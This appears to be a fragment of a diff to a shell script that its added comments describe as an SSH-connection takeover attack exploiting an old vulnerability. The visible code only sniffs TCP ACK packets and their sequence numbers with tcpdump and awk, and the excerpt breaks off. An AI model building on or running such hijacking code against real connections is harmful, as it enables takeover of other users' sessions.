@@ -1,4 +1,6 @@
 #!/bin/sh
+# attack based on old vulnerability 
+# attacker takes over ssh connection
 tcpdump -S -n -e -l "tcp[13] & 16 == 16" | awk '{
 # Output numbers as unsigned
   CONVFMT="%u";
